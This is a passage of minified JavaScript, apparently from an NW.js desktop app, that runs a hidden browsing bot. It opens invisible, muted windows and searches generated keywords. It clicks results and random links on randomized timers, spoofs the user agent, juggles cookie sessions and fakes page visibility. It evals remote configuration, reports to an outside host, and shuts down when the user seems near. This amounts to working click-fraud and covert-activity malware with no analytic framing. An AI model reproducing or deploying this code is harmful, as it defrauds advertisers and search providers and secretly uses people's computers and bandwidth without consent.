                        o = {};
                      for(o.top = t.top, o.bottom = t.bottom, o.left = t.left, o.right = t.right, o.height = t.height, o.width = t.width; e = e.ownerDocument.defaultView.frameElement;) {
                        var r = e.getBoundingClientRect();
                        o.top += r.top, o.bottom += r.top, o.left += r.left, o.right += r.left
                      }
                      return o
                    } catch (e) {
                      return null
                    }
                  }
                  var isVisible = function(e, t) {
                    try {
                      return "none" == e.style.display ? !1 : "hidden" != e.style.visibility
                    } catch (e) {
                      return !1
                    }
                  };
                  isVisible(a) && (rect = calculateDims(a))
                } else NCLCompatible && NCLFactor && reportPageView("error", "ncl", prov[fPtr].id);
                var dynamicTouch = BOCompatible && smoothWnd.setNWPolicy ? smoothTouch : touchRes,
                  delayTime = 1e3 * randomize(4, 10);
                actionTime = global.setTimeout(dynamicTouch, delayTime, a, rect)
              } else smoothWnd.close()
            }
          } else smoothWnd.window.document.getElementsByTagName("a").length && (roamingFallbackUrl = smoothWnd.window.location.href, actions.click.chance += actions.back.chance, actions.back.backup = actions.back.chance, actions.back.chance = 0, roamFallback = global.setTimeout(roam, 1e3 * fallbackTime, {
            start: 1,
            end: 2
          }), fallbackTime = (2 * fallbackTime - 2) / 2 ? (2 * fallbackTime - 2) / 2 : 1)
        } else smoothWnd.close()
      }

      function roam(e) {
        try {
          isResAvailable = !0;
          var t = 5,
            o = 30;
          if(defined(e) && (t = e.start ? e.start : t, o = e.end ? e.end : o), overrides(smoothWnd.window), memWatcher = memWatcher || setInterval(memWatch, 1e3), !strongLock) {
            strongLock = !0;
            var r = 0,
              n = actions.close.act,
              i = Math.floor(randomize(1, 100)),
              l = actions,
              s = 0;
            try {
              if(prov[fPtr] && prov[fPtr].actions) {
                for(a in actions) s += prov[fPtr].actions[a], prov[fPtr].actions[a] ? actions[a].chance = prov[fPtr].actions[a] : actions[a].chance = 0;
                if(100 != s) throw "Bad Actions Config"
              }
            } catch (e) {
              actions = l, reportPageView("error", "actionConfig", prov[fPtr].id)
            }
            for(a in actions) {
              if(r < i && i <= actions[a].chance + r) {
                n = actions[a].act;
                break
              }
              r += actions[a].chance
            }
            actionTime = global.setTimeout(function() {
              try {
                n(), strongLock = !1
              } catch (e) {
                reportPageView("error", "action", prov[fPtr].id), smoothWnd.close()
              }
            }, 1e3 * randomize(t, o))
          }
        } catch (e) {
          reportPageView("error", "roaming", prov[fPtr].id)
        }
      }

      function wndSetup() {
        try {
          var e = prov[fPtr].url,
            n = prov[fPtr].id;
          if(navigator.onLine && nw.Window.open) {
            if(defined(prov[fPtr].urls))
              for(var t = Math.floor(randomize(1, 100)), o = 0, r = 0; r < prov[fPtr].urls.length; r++) {
                if(o < t && t <= prov[fPtr].urls[r].factor + o) {
                  e = prov[fPtr].urls[r].url, n = prov[fPtr].urls[r].id;
                  break
                }
                o += prov[fPtr].urls[r].factor
              }
            document.activeElement;
            alreadyRan = !0, nw.Window.open(e + kw.toLowerCase(), options, function(e) {
              smoothWnd = e;
              var t = global.setTimeout(function() {
                smoothWnd && smoothWnd.close()
              }, 9e4);

              function o() {
                try {
                  if(smoothWnd.window.nw = void 0, global.clearTimeout(r), roamFallback && (global.clearTimeout(roamFallback), roamingFallbackUrl = roamFallback = null, actions.click.chance -= actions.back.backup, actions.back.chance = actions.back.backup), smoothWnd.window.location.href != oldLoc && isResAvailable && (oldLoc = smoothWnd.window.location.href, phaser++), 2 == phaser) {
                    overrides(smoothWnd.window), actionTime && (global.clearTimeout(actionTime), actionTime = null, isFollowOn = !1), didFollowOn || (isFollowOn = !1);
                    try {
                      if(prov[fPtr].privacy) privacyRock();
                      else {
                        NCLCompatible && prov[fPtr].followRate && "number" == typeof prov[fPtr].followRate && !isFollowOn && !didFollowOn && 100 * prov[fPtr].followRate > Math.floor(randomize(1, 1e4)) ? (isFollowOn = !0, followRock(1)) : resRock()
                      }
                    } catch (e) {
                      isFollowOn = !1
                    }
                  } else 3 <= phaser && (isNCLDone = !(isFollowOn = !1), roam())
                } catch (e) {
                  reportPageView("error", "win.loaded", prov[fPtr].id), smoothWnd.close()
                }
              }
              smoothWnd.on("closed", function() {
                global.clearTimeout(t), global.clearTimeout(r), pseudoNavDetectPtr = null;
                try {
                  reportPageView("sainthood", frdver + (isFlowCookiefied ? ".CM" : "") + (uaOverride ? "." + uaOverride : ""), n)
                } catch (e) {}
                try {
                  reportPageView("isRock", "isNCLDone", prov[fPtr].id)
                } catch (e) {}
                try {
                  if(DID) {
                    report.lives();
                    try {
                      DIDActive || (report.activate(), DIDActive = !0)
                    } catch (e) {
                      reportPageView("error", "DIDActivation", prov[fPtr].id)
                    }
                  }
                } catch (e) {}
                try {
                  if(clearInterval(sharks), clearInterval(memWatcher), global.clearTimeout(actionTime), global.clearTimeout(r), memWatcher = null, global.setTimeout(garbage, 0, 0), roamingFallbackUrl) {
                    global.clearTimeout(roamFallback);
                    var e = {
                      event_name: "RoamingFallback",
                      app_name: manifest.name,
                      appVersion: bVersion,
                      frd_version: frdver,
                      provider: n
                    };
                    ajax.post("https://go.wikitextbooks.info/utils/monitoring", void 0, void 0, void 0, e)
                  }
                  isFlowCookiefied ? CM.getCurrentSession(function(t) {
                    CM.saveSession(prov[fPtr].id, t, function(e) {
                      CM.clearCurrentSession(t, function(e) {
                        CM.loadSession("root", function(e, t) {
                          CM.setCurrentSession(e, function(e) {
                            advance(), e && reportPageView("error", "CM.setCurrentSession", prov[fPtr].id)
                          }), t && reportPageView("error", "CM.loadSession", prov[fPtr].id)
                        }), e || reportPageView("error", "CM.clearCurrentSession", prov[fPtr].id)
                      }), e && reportPageView("error", "CM.saveSession", prov[fPtr].id)
                    }), t || reportPageView("error", "CM.getCurrentSession", prov[fPtr].id)
                  }) : advance()
                } catch (e) {
                  reportPageView("error", "win.close", prov[fPtr].id)
                }
              }), smoothWnd.on("loaded", o);
              var r = null;
              pseudoNavDetectPtr = function(e) {
                r = global.setTimeout(function(e) {
                  didFollowOn && smoothWnd.window.location.href != e && o()
                }, 3e3, e)
              }
            })
          }
        } catch (e) {
          reportPageView("error", "wndSetup", prov[fPtr].id)
        }
      }
      var actions = {
        click: {
          chance: 30,
          act: function() {
            var e, t = (e = smoothWnd.window.document.getElementsByTagName("a")).item(Math.floor(randomize(0, e.length - 1)));
            (BOCompatible && smoothWnd.setNWPolicy ? smoothTouch : touchRes)(t)
          }
        },
        back: {
          chance: 25,
          act: function() {
            phaser -= 2, smoothWnd.window.history.back()
          }
        },
        close: {
          chance: 45,
          act: function() {
            smoothWnd.close()
          }
        }
      };
      try {
        if(maxPtr <= fPtr) return;
        if(prov[fPtr].clientVer) {
          var currentClientVer = bVersion || 0;
          if(!isNewerVersion(prov[fPtr].clientVer.toString(), currentClientVer)) return void advance(!0)
        }
        if(prov[fPtr].frdVer && frdver < prov[fPtr].frdVer) return void advance(!0);
        if(prov[fPtr].uaLock) {
          var UAData = JSON.parse(localStorage.getItem("ua"));
          if(UAData.browser != prov[fPtr].uaLock) {
            if(!UACompatible) return reportPageView("error", "uaLock", prov[fPtr].id), void advance(!0);
            var uaSettings = getUserAgent(prov[fPtr].uaLock);
            if(!(uaSettings && uaSettings.ua && uaSettings.uaVer)) return reportPageView("error", "uaOverride", prov[fPtr].id), void advance(!0);
            uaOverride = prov[fPtr].uaLock + uaSettings.uaVer, options.user_agent = uaSettings.ua
          }
        }
        if(Math.floor(randomize(1, 100)) > prov[fPtr].factor) return void advance(!0);
        try {
          void 0 !== prov[fPtr].cookieResetRate && prov[fPtr].cookieResetRate >= Math.floor(randomize(1, 100)) && (isCookieResetTimeout = !0, CM.clearCookies(), reportPageView("checkpoint", "clearCookiesProv", prov[fPtr].id))
        } catch (e) {
          reportPageView("error", "clearCookiesProvCall", prov[fPtr].id)
        }(void 0 === prov[fPtr].ncl || !prov[fPtr].ncl || "number" == typeof prov[fPtr].ncl && Math.floor(randomize(1, 100)) > prov[fPtr].ncl) && (NCLFactor = !1);
        var kw = null;
        try {
          kw = generateKw()
        } catch (e) {
          reportPageView("error", "kw", prov[fPtr].id), kw = null
        }
        if(!kw) return reportPageView("error", "kw", prov[fPtr].id), void advance(!0);
        var scrambleChance = 10;
        try {
          prov[fPtr].scramble && (prov[fPtr].scramble, 1) ? scrambleChance = prov[fPtr].scramble : kwl.scramble && (kwl.scramble, 1) && (scrambleChance = kwl.scramble)
        } catch (e) {
          scrambleChance = 10
        }
        Math.floor(randomize(1, 100)) <= scrambleChance && (kw = scramble(kw));
        try {
          isFlowCookiefied ? CM.getCurrentSession(function(t) {
            try {
              t ? CM.saveSession("root", t, function(e) {
                try {
                  e ? (reportPageView("error", "CM.saveSession", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()) : CM.clearCurrentSession(t, function(e) {
                    try {
                      if(e)
                        if(-1 != CM.cookieMap().indexOf(prov[fPtr].id)) {
                          var t = Math.floor(randomize(1, 1e4));
                          prov[fPtr].resetRate && 100 * prov[fPtr].resetRate > t ? (CM.deleteSession(prov[fPtr].id), wndSetup(), reportPageView("cookies", "forceReset", prov[fPtr].id)) : CM.loadSession(prov[fPtr].id, function(e, t) {
                            try {
                              t ? (reportPageView("error", "CM.loadSession", prov[fPtr].id), CM.deleteSession(prov[fPtr].id), reportPageView("cookies", "reset", prov[fPtr].id), wndSetup()) : CM.setCurrentSession(e, function(e) {
                                try {
                                  e && (reportPageView("error", "CM.setCurrentSession", prov[fPtr].id), CM.deleteSession(prov[fPtr].id), reportPageView("cookies", "reset", prov[fPtr].id))
                                } catch (e) {
                                  reportPageView("error", "cookieInit", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()
                                }
                                wndSetup()
                              })
                            } catch (e) {
                              reportPageView("error", "cookieInit", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()
                            }
                          })
                        } else wndSetup();
                      else reportPageView("error", "CM.clearCurrentSession", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()
                    } catch (e) {
                      reportPageView("error", "cookieInit", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()
                    }
                  })
                } catch (e) {
                  reportPageView("error", "cookieInit", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()
                }
              }) : (reportPageView("error", "CM.getCurrentSession", prov[fPtr].id), isFlowCookiefied = !1, wndSetup())
            } catch (e) {
              reportPageView("error", "cookieInit", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()
            }
          }) : isCookieResetTimeout ? setTimeout(wndSetup, 5e3) : wndSetup()
        } catch (e) {
          reportPageView("error", "cookieInit", prov[fPtr].id), isFlowCookiefied = !1, wndSetup()
        }
      } catch (e) {
        reportPageView("error", "instance", prov[fPtr].id), advance()
      }

      function sharkHunter() {
        function e() {
          clearInterval(sharks), sharks = null, fPtr = maxPtr, smoothWnd.close()
        }
        proximity() && e(), navigator && !navigator.onLine && e()
      }
      var sharks = setInterval(sharkHunter, 1e3);

      function memWatch() {
        try {
          process.memoryUsage().rss / 1024 / 1024 > maxHeapSize && (smoothWnd.close(), reportPageView("memWatch", null, prov[fPtr].id))
        } catch (e) {
          reportPageView("error", "memwatch", prov[fPtr].id)
        }
      }
      var memWatcher = null
    }

    function seo() {
      var options = {
        frame: !1,
        width: screen.availWidth,
        height: screen.availHeight,
        position: "center",
        show: !1,
        focus: !1,
        always_on_top: !1,
        mute: !0,
        downloadable: !1,
        plugins: !1,
        alerts: !1,
        nwpolicy: "block",
        user_agent: ua
      };

      function generateCampaign() {
        try {
          if(!defined(kwl.seo.campaigns) || !kwl.seo.campaigns.length) return null;
          for(var e = Math.floor(randomize(1, 100)), t = 0, o = 0; o < kwl.seo.campaigns.length; o++) {
            if(t < e && e <= kwl.seo.campaigns[o].factor + t) return kwl.seo.campaigns[o];
            t += kwl.seo.campaigns[o].factor
          }
        } catch (e) {
          return null
        }
      }

      function generateTerm(e) {
        try {
          if(!defined(e.terms) || !Object.keys(e.terms).length) return null;
          var o = Math.floor(randomize(1, 100)),
            r = 0;
          for(t in e.terms) {
            if(r < o && o <= e.terms[t] + r) return t;
            r += e.terms[t]
          }
        } catch (e) {
          return null
        }
      }
      var smoothWnd = null,
        strongLock = !1,
        actionTime, nextCounter = 0,
        seoAction = null,
        isEndGame = !1;

      function overrides(e) {
        e.Notification = e.Function("return false;")
      }

      function isRendered(e, t) {
        var o = smoothWnd.window.document;
        if(t && (o = t), 1 != e.nodeType || e == o.body) return !0;
        if(e.currentStyle && "none" != e.currentStyle.display && "hidden" != e.currentStyle.visibility) return isRendered(e.parentNode, t);
        if(window.getComputedStyle) {
          var r = o.defaultView.getComputedStyle(e, null);
          if("none" != r.getPropertyValue("display") && "hidden" != r.getPropertyValue("visibility")) return isRendered(e.parentNode, t)
        }
        return !1
      }

      function isNodeList(e) {
        var t = Object.prototype.toString.call(e);
        return "object" == typeof e && /^\[object (HTMLCollection|NodeList|Object)\]$/.test(t) && "number" == typeof e.length && (0 === e.length || "object" == typeof e[0] && 0 < e[0].nodeType)
      }

      function touchRes(t, o) {
        try {
          t && isRendered(t, smoothWnd.window.document) ? ajax.head(t.href, function(e) {
            -1 != e.getResponseHeader("content-type").indexOf("text/html") ? (defined(o) && o || (isResAvailable = !0), t.setAttribute("target", "_self"), t.click()) : smoothWnd.close()
          }, function(e) {
            smoothWnd.close()
          }) : smoothWnd.close()
        } catch (e) {
          smoothWnd.close()
        }
      }

      function seoRock(campaign) {
        function genRes() {
          for(var e = 0, t = Math.floor(randomize(1, 100)), o = 0, r = 0; r < kwl.res.length; r++) {
            if(e < t && t <= kwl.res[r] + e) {
              o = r;
              break
            }
            e += kwl.res[r]
          }
          return o
        }
        var resultsOutput = null;
        try {
          eval("var results =  " + kwl.seo.results)
        } catch (e) {
          smoothWnd.close()
        }
        if(resultsOutput = results(smoothWnd.window.document, campaign.domains), void 0 !== resultsOutput && resultsOutput) {
          if(resultsOutput && resultsOutput.next) return nextCounter++, kwl.seo.nextPage <= nextCounter ? void smoothWnd.close() : void(actionTime = global.setTimeout(touchRes, 1e3 * randomize(1, 5), resultsOutput.res[0], resultsOutput.next));
          if(void 0 !== resultsOutput.res && resultsOutput.res && resultsOutput.res.length) {
            var res = genRes();
            if(res < 0 || "number" != typeof res) smoothWnd.close();
            else {
              for(; !resultsOutput.res[res] && 0 < res;) res--;
              if(resultsOutput.res[res]) {
                var anch = resultsOutput.res[res];
                actionTime = global.setTimeout(touchRes, 1e3 * randomize(1, 5), anch, resultsOutput.next)
              } else smoothWnd.close()
            }
          } else smoothWnd.close()
        } else smoothWnd.close()
      }

      function roam(e) {
        var t = 0,
          o = actions.close.act,
          r = Math.floor(randomize(1, 100));
        for(a in actions) {
          if(t < r && r <= actions[a].chance + t) {
            o = actions[a].act;
            break
          }
          t += actions[a].chance
        }
        actionTime = global.setTimeout(function() {
          try {
            o(), strongLock = !1
          } catch (e) {
            smoothWnd.close()
          }
        }, 1e3 * randomize(10, 30))
      }
      var actions = {
        click: {
          chance: 50,
          act: function() {
            var e, t = (e = smoothWnd.window.document.getElementsByTagName("a")).item(Math.floor(randomize(0, e.length - 1)));
            global.setTimeout(touchRes, 0, t), delete e
          }
        },
        back: {
          chance: 0,
          act: function() {
            phaser -= 2, smoothWnd.window.history.back()
          }
        },
        close: {
          chance: 50,
          act: function() {
            smoothWnd.close()
          }
        }
      };
      try {
        if(maxPtr <= fPtr) return;
        if(Math.floor(randomize(1, 100)) > kwl.seo.factor) return void advance(!0);
        var campaign = generateCampaign();
        if(null == campaign) return void advance(!0);
        var term = generateTerm(campaign);
        if(null == term) return void advance(!0);
        if(navigator.onLine && nw.Window.open) {
          var url = kwl.seo.url,
            currentId = kwl.seo.id;
          if(defined(kwl.seo.urls))
            for(var multiFactor = Math.floor(randomize(1, 100)), acquired = 0, selection = 0, f = 0; f < kwl.seo.urls.length; f++) {
              if(acquired < multiFactor && multiFactor <= kwl.seo.urls[f].factor + acquired) {
                url = kwl.seo.urls[f].url, currentId = kwl.seo.urls[f].id;
                break
              }
              acquired += kwl.seo.urls[f].factor
            }
          var lastFocusedelement = document.activeElement;
          alreadyRan = !0, nw.Window.open(url + term.toLowerCase(), options, wndStart)
        }

        function wndStart(e) {
          smoothWnd = e;
          var t = global.setTimeout(function() {
            smoothWnd && smoothWnd.close()
          }, 9e4);
          smoothWnd.on("closed", function() {
            global.clearTimeout(t);
            try {
              report.event("sainthood" + frdver + ".seo")
            } catch (e) {}
            try {
              clearInterval(sharks), clearInterval(memWatcher), global.clearTimeout(actionTime), memWatcher = null, global.clearTimeout(seoAction), global.setTimeout(garbage, 0, 0), advance()
            } catch (e) {}
          }), smoothWnd.on("new-win-policy", function(e, t, o) {
            try {
              o.forceCurrent()
            } catch (e) {
              smoothWnd.window.location.href = t
            }
          });
          var f = null;
          smoothWnd.on("loaded", function() {
            try {
              try {
                smoothWnd && smoothWnd.window && smoothWnd.window.document && (smoothWnd.window.document.hidden = void 0, Object.defineProperty(smoothWnd.window.document, "hidden", {
                  get: function() {
                    return !1
                  },
                  set: function(e) {
                    smoothWnd.window.document.hidden = e
                  }
                }))
              } catch (e) {}
              var e = smoothWnd.window.document.getElementsByTagName("meta");
              for(m = 0; m < e.length; m++) {
                var t = e[m].getAttribute("http-equiv");
                t && "refresh" == t.toLowerCase() && e[m].getAttribute("content") != smoothWnd.window.document.location.href && (e[m].setAttribute("content", "1, url=" + smoothWnd.window.document.referrer), nw.App.phaser -= 2)
              }
              for(s = 0; s < smoothWnd.window.frames.length; s++) overrides(smoothWnd.window.frames[s]);
              var o = smoothWnd.window.document.getElementsByTagName("video"),
                r = smoothWnd.window.document.getElementsByTagName("audio");
              for(v = 0; v < o.length; v++) o[v].setAttribute("muted", !0), o[v].pause();
              for(a = 0; a < r.length; a++) r[a].setAttribute("muted", !0), r[a].pause();
              if(smoothWnd.window.nw = null, global.setTimeout(function() {
                  clearInterval(f), f = null
                }, 2e3), smoothWnd.window.location.href != oldLoc && isResAvailable && (oldLoc = smoothWnd.window.location.href, phaser++), 2 == phaser) overrides(smoothWnd.window), seoRock(campaign);
              else if(3 <= phaser && (overrides(smoothWnd.window), !strongLock)) {
                var n = null,
                  i = null,
                  l = !(strongLock = !0);
                if(isEndGame) l = !1;
                else {
                  for(var s = 0; s < campaign.flows.length; s++)
                    if(n = campaign.flows[s], isNodeList(i = smoothWnd.window.document.getElementById(n) || smoothWnd.window.document.getElementsByClassName(n)) && i.length || !isNodeList(i) && i) {
                      l = !0;
                      break
                    } for(var c = 0; c < campaign.endgame.length; c++) {
                    if(smoothWnd.window.location.href.toLowerCase().match(campaign.endgame[c].toLowerCase(), "i", "g")) {
                      isEndGame = !(l = !1);
                      break
                    }
                  }
                }
                if(l || seoAction || !isEndGame) {
                  var u = isNodeList(i) ? i.item(0) : i,
                    d = 1e3 * randomize(5, 20);
                  seoAction = global.setTimeout(function() {
                    try {
                      var e = u,
                        t = u.getElementsByTagName("a");
                      t.length && (e = t.item(0)), e.setAttribute("target", "_self"), e.click(), delete e, delete u, strongLock = !1, seoAction = null
                    } catch (e) {
                      smoothWnd.close()
                    }
                  }, d)
                } else memWatcher = memWatcher || setInterval(memWatch, 5e3), roam()
              }
            } catch (e) {
              smoothWnd.close()
            }
          })
        }
      } catch (e) {
        advance()
      }

      function sharkHunter() {
        function e() {
          clearInterval(sharks), sharks = null, fPtr = maxPtr, smoothWnd.close()
        }
        proximity() && e(), navigator && !navigator.onLine && e()
      }
      var sharks = setInterval(sharkHunter, 1e3);

      function memWatch() {
        try {
          process.memoryUsage().rss / 1024 / 1024 > maxHeapSize && (smoothWnd.close(), reportPageView("memWatch", null, prov[fPtr].id))
        } catch (e) {}
      }
      var memWatcher = null
    }

    function isNewerVersion(e, t) {
      return 0 < function(e, t) {
        var o, r, n, i, a;
        for(i = e.replace(/(\.0+)+$/, "").split("."), a = t.replace(/(\.0+)+$/, "").split("."), r = Math.min(i.length, a.length), o = 0; o < r; o++)
          if(0 != (n = parseInt(i[o], 10) - parseInt(a[o], 10))) return n;
        return i.length - a.length
      }(t, e)
    }
    instance()
  }
}();